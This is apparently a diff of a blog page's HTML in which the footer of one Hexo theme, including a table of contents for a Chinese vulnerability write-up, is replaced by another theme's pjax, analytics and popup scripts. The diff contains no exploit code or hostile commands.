-                                      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
-                                  </div>
-                              </button>
-                          
-                          
-                      
-                    
-                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
-                  </div>
-              </div>
-            </div>
-        </div>
-    </div>
-     
-    <div id="nexmoe-search-space">
-        <div class="search-container">
-            <div class="search-header">
-                <div class="search-input-container">
-                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
-                </div>
-                <a class="search-close" onclick="sclose();">×</a>
-            </div>
-            <div class="search-body"></div>
-        </div>
-    </div>
+  typeof typed === 'object' && typed.destroy()
 
-    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
-<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
 
- 
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
 
-<script async src="/js/app.js?v=1710043516198"></script>
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
 
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
+  typeof panguInit === 'function' && panguInit()
 
-<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
-<script>
-	$(".justified-gallery").justifiedGallery({
-		rowHeight: 160,
-		margins: 10,
-	});
-</script>
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
 
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
 
-    
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
 
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
 
-
-
-
-</body>
-
-</html>
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
